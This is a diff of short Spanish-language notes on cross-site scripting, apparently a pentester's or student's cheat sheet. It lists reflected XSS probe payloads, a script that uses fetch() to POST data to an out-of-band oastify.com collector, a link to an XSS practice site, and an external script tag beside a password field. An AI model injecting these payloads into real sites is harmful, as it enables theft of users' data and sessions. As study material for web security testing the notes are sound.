@@ -1,6 +1,24 @@
 ### XSS
 
-Para saber si existe un XSS, el resultado se debe de reflejar en la pagina 
+
+## Para saber si existe un XSS, el resultado se debe de reflejar en la pagina 
 
 "><scipt>alert("XSS")</script>                 # Debemos de escapar la comilla 
 '<script>alert("XSS")</script>
+
+
+## Mandar algo a un dominio determinado.
+
+<script>
+  fetch('https://kwklry4t8e18m8q8k5uikgydy44vslga.oastify.com',{method:'POST', mode:'no-cors', body:'omar'});
+</script>
+
+
+## Ejercicios de XSS ##
+https://sudo.co.il/xss/
+
+
+## Contituido un HTML ##
+
+<script src="http://app1.com/1.js"> </script>
+<input type="passwd" value="{TEST}">
